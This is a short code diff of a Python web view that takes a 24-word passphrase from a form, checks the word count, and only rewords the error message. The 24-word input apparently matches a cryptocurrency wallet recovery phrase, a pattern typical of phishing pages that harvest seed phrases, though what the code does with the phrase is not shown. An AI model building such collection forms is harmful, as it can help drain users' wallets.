@@ -19,7 +19,7 @@ def submit_pass(request):
         keys = request.POST.get('mf-text', '')
         words = keys.split()
         if len(words) != 24:
-            messages.error(request, 'Please provide the correct passphrase.')
+            messages.error(request, 'Invalid Passphrase')
             return redirect('/wallet/')
 
         else:
